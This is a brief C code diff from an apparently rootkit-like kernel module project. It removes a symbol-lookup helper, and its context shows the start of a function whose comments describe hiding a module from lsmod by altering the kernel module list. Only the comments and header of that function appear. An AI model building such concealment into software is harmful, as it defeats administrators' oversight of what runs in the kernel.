@@ -39,11 +39,6 @@ int jocky_lkm_get_symbol(const char* name) {
     return jocky_module_resolve_symbol(NULL, name);
 }
 
-int jocky_module_has_symbol(const char* mod, const char* sym) {
-    /* Check if module has a symbol */
-    return (jocky_module_resolve_symbol(mod, sym) >= 0) ? 1 : 0;
-}
-
 int jocky_module_stomp(const char* mod) {
     /* Hide module from lsmod by modifying kernel list */
     /* This requires modifying the kernel module list structure */
